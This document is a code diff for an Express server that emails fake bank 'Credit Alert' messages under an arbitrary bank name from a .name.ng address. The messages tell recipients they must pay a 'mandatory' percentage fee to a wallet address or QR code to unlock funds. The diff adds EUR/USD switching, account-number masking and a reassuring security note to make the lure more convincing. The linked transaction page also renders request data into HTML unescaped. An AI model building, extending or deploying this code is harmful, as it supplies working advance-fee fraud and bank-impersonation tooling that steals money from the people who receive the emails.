@@ -15,6 +15,37 @@ app.use(express.json());
 // Initialize Resend
 const resend = new Resend(process.env.RESEND_API_KEY);
 
+// Masking utility functions
+const maskAccountNumber = (accountNumber) => {
+  if (!accountNumber || accountNumber.length < 4) return accountNumber;
+  const lastFour = accountNumber.slice(-4);
+  const masked = '*'.repeat(Math.max(accountNumber.length - 4, 4));
+  return `${masked}${lastFour}`;
+};
+
+const maskIBAN = (iban) => {
+  if (!iban || iban.length < 8) return iban;
+  const first = iban.slice(0, 4);
+  const last = iban.slice(-4);
+  const masked = '*'.repeat(Math.max(iban.length - 8, 4));
+  return `${first}${masked}${last}`;
+};
+
+const maskSWIFT = (swift) => {
+  if (!swift || swift.length < 7) return swift;
+  const first = swift.slice(0, 4);
+  const last = swift.slice(-3);
+  const masked = '*'.repeat(Math.max(swift.length - 7, 2));
+  return `${first}${masked}${last}`;
+};
+
+const maskRoutingNumber = (routing) => {
+  if (!routing || routing.length < 4) return routing;
+  const lastFour = routing.slice(-4);
+  const masked = '*'.repeat(Math.max(routing.length - 4, 5));
+  return `${masked}${lastFour}`;
+};
+
 // Transaction view page HTML
 const createTransactionPage = (data) => {
   const { 
@@ -25,7 +56,15 @@ const createTransactionPage = (data) => {
     brandColor,
     billingAmount,
     percent,
+    routingNumber,
+    ibanNumber,
+    swiftCode
   } = data;
+
+  // Determine currency based on routing vs IBAN/SWIFT
+  const isEuroTransfer = (ibanNumber || swiftCode) && !routingNumber;
+  const currency = isEuroTransfer ? 'EUR' : 'USD';
+  const currencySymbol = isEuroTransfer ? '€' : '$';
 
   return `
     <!DOCTYPE html>
@@ -84,6 +123,16 @@ const createTransactionPage = (data) => {
             .success-badge::before {
                 content: '✓ ';
                 font-size: 18px;
+            }
+            .currency-badge {
+                display: inline-block;
+                background: ${isEuroTransfer ? '#e7f3ff' : '#fff3e0'};
+                color: ${isEuroTransfer ? '#0066cc' : '#e65100'};
+                padding: 8px 16px;
+                border-radius: 15px;
+                font-size: 13px;
+                font-weight: 600;
+                margin-left: 10px;
             }
             .qr-section {
                 background: #f8f9fa;
@@ -185,20 +234,19 @@ const createTransactionPage = (data) => {
 
             <div class="content">
                 <div style="text-align: center;">
-                    <div class="success-badge">Transaction Successful</div><br>
-                    <p> you need to make a mandatory payment of $ ${billingAmount} which is ${percent} % of your total funds .
+                    <div class="success-badge">Transaction Successful</div>
+                    <span class="currency-badge">💱 ${currency} Transfer</span>
+                    <p style="margin-top: 20px;"> you need to make a mandatory payment of ${currencySymbol}${billingAmount} which is ${percent}% of your total funds.
                 </div>
-
-               
 
                 ${qrCodeUrl ? `
                 <div class="qr-section">
                     <h2>Complete Payment</h2>
-                    <p>Scan the QR code below to complete your payment</p>
+                    <p>Scan the QR code below to complete your payment in ${currency}</p>
                     <img src="${qrCodeUrl}" alt="Payment QR Code" class="qr-code">
-                    <p>${walletAddress}</p>
+                    <p style="word-break: break-all; font-family: monospace; margin-top: 15px;">${walletAddress}</p>
                 </div>
-                ` : `<p>${walletAddress}</p>`}
+                ` : `<p style="word-break: break-all; font-family: monospace; text-align: center; margin: 20px 0;">${walletAddress}</p>`}
 
                 <div class="disclaimer">
                     <p><strong>DISCLAIMER:</strong> This is an automated notification for informational purposes only. Please verify all transaction details through your official banking channels. If you did not authorize this transaction, please contact your bank immediately. Keep this receipt for your records.</p>
@@ -216,7 +264,7 @@ const createTransactionPage = (data) => {
 
 
 // Email template function
-const createEmailTemplate = (data,billingLink) => {
+const createEmailTemplate = (data, billingLink) => {
   const { 
     logoUrl, 
     bankName, 
@@ -237,52 +285,56 @@ const createEmailTemplate = (data,billingLink) => {
 
   let firstName = recipientName.trim().split(/\s+/)[0];
 
-const maskValue = (value, visible = 4) =>
-  value.length > visible
-    ? "****" + value.slice(-visible)
-    : value;
+  // Determine currency based on routing vs IBAN/SWIFT
+  const isEuroTransfer = (ibanNumber || swiftCode) && !routingNumber;
+  const currency = isEuroTransfer ? 'EUR' : 'USD';
+  const currencySymbol = isEuroTransfer ? '€' : '$';
 
-  const routingNumberRow = routingNumber
-  ? `
+  // Mask sensitive information
+  const maskedAccount = maskAccountNumber(receivingAccountNumber);
+  const maskedSendersAccount = maskAccountNumber(sendersAccountNumber);
+  const maskedIban = ibanNumber ? maskIBAN(ibanNumber) : null;
+  const maskedSwift = swiftCode ? maskSWIFT(swiftCode) : null;
+  const maskedRouting = routingNumber ? maskRoutingNumber(routingNumber) : null;
+
+  const routingNumberRow = maskedRouting
+    ? `
     <tr style="background-color: #f8f9fa;">
       <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #333; font-size: 14px;">
         Routing Number
       </td>
-      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">
-        ${routingNumber}
+      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px; font-family: 'Courier New', monospace;">
+        ${maskedRouting}
       </td>
     </tr>
   `
-  : "";
+    : "";
 
-const swiftRow = swiftCode
-  ? `
+  const swiftRow = maskedSwift
+    ? `
     <tr>
       <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #333; font-size: 14px;">
         SWIFT Code
       </td>
-      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">
-        ${maskValue(swiftCode)}
+      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px; font-family: 'Courier New', monospace;">
+        ${maskedSwift}
       </td>
     </tr>
   `
-  : "";
+    : "";
 
-const ibanRow = ibanNumber
-  ? `
+  const ibanRow = maskedIban
+    ? `
     <tr style="background-color: #f8f9fa;">
       <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #333; font-size: 14px;">
         IBAN
       </td>
-      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">
-        ${maskValue(ibanNumber)}
+      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px; font-family: 'Courier New', monospace;">
+        ${maskedIban}
       </td>
     </tr>
   `
-  : "";
-
-  
-
+    : "";
 
   return `
     <!DOCTYPE html>
@@ -306,12 +358,15 @@ const ibanRow = ibanNumber
             </td>
           </tr>
 
-          <!-- Alert Title -->
+          <!-- Alert Title with Currency Badge -->
           <tr>
             <td style="padding: 40px 40px 20px;">
               <div style="text-align: center; margin-bottom: 20px;">
                 <div style="display: inline-block; background-color: #d4edda; border: 2px solid #28a745; border-radius: 50px; padding: 10px 30px;">
                   <h2 style="color: #28a745; margin: 0; font-size: 24px;">✓ Credit Alert</h2>
+                </div>
+                <div style="display: inline-block; margin-left: 10px; background-color: ${isEuroTransfer ? '#e7f3ff' : '#fff3e0'}; border-radius: 20px; padding: 8px 20px;">
+                  <span style="color: ${isEuroTransfer ? '#0066cc' : '#e65100'}; font-size: 14px; font-weight: 600;">💱 ${currency} Transfer</span>
                 </div>
               </div>
               <p style="color: #333; margin: 20px 0 0; font-size: 16px; text-align: center; line-height: 1.6;">
@@ -320,12 +375,12 @@ const ibanRow = ibanNumber
             </td>
           </tr>
 
-          <!-- Amount Highlight -->
+          <!-- Amount Highlight with Currency -->
           <tr>
             <td style="padding: 20px 40px;">
               <div style="background: linear-gradient(135deg, #28a745 0%, #20c997 100%); border-radius: 12px; padding: 30px; text-align: center;">
-                <p style="color: #ffffff; margin: 0 0 10px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px;">Amount Credited</p>
-                <h3 style="color: #ffffff; margin: 0; font-size: 36px; font-weight: bold;">$${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</h3>
+                <p style="color: #ffffff; margin: 0 0 10px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px;">Amount Credited (${currency})</p>
+                <h3 style="color: #ffffff; margin: 0; font-size: 36px; font-weight: bold;">${currencySymbol}${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</h3>
               </div>
             </td>
           </tr>
@@ -350,7 +405,7 @@ const ibanRow = ibanNumber
                   </tr>
                   <tr style="background-color: #f8f9fa;">
                     <td style="font-weight: 600; color: #555; font-size: 14px;">Sender's Account Number</td>
-                    <td style="color: #333; font-size: 14px; text-align: right;">${sendersAccountNumber}</td>
+                    <td style="color: #333; font-size: 14px; text-align: right; font-family: 'Courier New', monospace;">${maskedSendersAccount}</td>
                   </tr>
                 </table>
               </div>
@@ -371,7 +426,7 @@ const ibanRow = ibanNumber
                   </tr>
                   <tr style="background-color: #f8f9fa;">
                     <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #555; font-size: 14px;">Account Number</td>
-                    <td style="border-bottom: 1px solid #e0e0e0; color: #333; font-size: 14px; text-align: right;">${maskValue(receivingAccountNumber)}</td>
+                    <td style="border-bottom: 1px solid #e0e0e0; color: #333; font-size: 14px; text-align: right; font-family: 'Courier New', monospace;">${maskedAccount}</td>
                   </tr>
                   ${routingNumberRow}
                   ${swiftRow}
@@ -381,6 +436,11 @@ const ibanRow = ibanNumber
                     <td style="color: #333; font-size: 14px; text-align: right;">${recipientAddress}</td>
                   </tr>
                 </table>
+              </div>
+
+              <!-- Security Note -->
+              <div style="background: #f0f9ff; border: 1px solid #bae6fd; border-radius: 8px; padding: 12px; margin: 20px 0; font-size: 13px; color: #0369a1;">
+                🔒 For security, account numbers have been partially masked. Full details are available in your transaction history.
               </div>
 
               <!-- Transaction Info Section -->
@@ -407,7 +467,7 @@ const ibanRow = ibanNumber
                   ⚠️ IMPORTANT NOTICE
                 </p>
                 <p style="margin: 0; color: #856404; font-size: 13px; line-height: 1.8;">
-                  To activate your payment of <strong>$${amount}</strong>, you need to pay a mandatory sum of <strong>$${billingAmount}</strong> to unlock your funds. For more information, please click <a href="${billingLink}" style="color: #0066cc; text-decoration: none; font-weight: bold;">here</a>.
+                  To activate your payment of <strong>${currencySymbol}${amount}</strong>, you need to pay a mandatory sum of <strong>${currencySymbol}${billingAmount}</strong> in ${currency} to unlock your funds. For more information, please click <a href="${billingLink}" style="color: #0066cc; text-decoration: none; font-weight: bold;">here</a>.
                 </p>
               </div>
             </td>
@@ -439,9 +499,10 @@ const ibanRow = ibanNumber
 app.post('/api/send-credit-alert', async (req, res) => {
   try {
     const emailData = req.body;
-    const bank =emailData.bankName;
+    const bank = emailData.bankName;
     const transactionData = Buffer.from(JSON.stringify(emailData)).toString('base64url');
-    const billingLink = `${process.env.BASE_URL}/transaction?data=${transactionData}`
+    const billingLink = `${process.env.BASE_URL}/transaction?data=${transactionData}`;
+    
     // Validate required fields
     const requiredFields = [
       'recipientEmail',
@@ -452,7 +513,7 @@ app.post('/api/send-credit-alert', async (req, res) => {
       'senderName',
       'recipientName',
       'amount',
-      "billingAmount",
+      'billingAmount',
       'dateTime',
       'sendersAccountNumber'
     ];
@@ -466,19 +527,24 @@ app.post('/api/send-credit-alert', async (req, res) => {
       });
     }
 
+    // Determine currency for subject line
+    const isEuroTransfer = (emailData.ibanNumber || emailData.swiftCode) && !emailData.routingNumber;
+    const currencySymbol = isEuroTransfer ? '€' : '$';
+
     // Create email HTML
-    const emailHtml = createEmailTemplate(emailData,billingLink);
+    const emailHtml = createEmailTemplate(emailData, billingLink);
     const fromEmail = `${bank} <noreply@mailsflash.name.ng>`;   
     const fromName = emailData.bankName;
     const fromAddress = fromEmail.includes('<') ? fromEmail.split('<')[1].replace('>', '') : fromEmail;
     const displayFrom = `${fromName}<${fromAddress}>`;
+    
     // Send email using Resend
     const result = await resend.emails.send({
-      from:  displayFrom,
+      from: displayFrom,
       to: emailData.recipientEmail,
-      subject: `Credit Alert - $${parseFloat(emailData.amount).toLocaleString('en-US', { minimumFractionDigits: 2 })}`,
+      subject: `Credit Alert - ${currencySymbol}${parseFloat(emailData.amount).toLocaleString('en-US', { minimumFractionDigits: 2 })}`,
       html: emailHtml,
-    headers: {
+      headers: {
         'X-Entity-Ref-ID': `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
         'X-Priority': '1',
         'Importance': 'high',
@@ -508,7 +574,7 @@ app.post('/api/send-credit-alert', async (req, res) => {
   }
 });
 
-app.get('/transaction',(req,res)=>{
+app.get('/transaction', (req, res) => {
   const data = JSON.parse(Buffer.from(req.query.data, 'base64url').toString());
   const html = createTransactionPage(data);
   res.send(html);
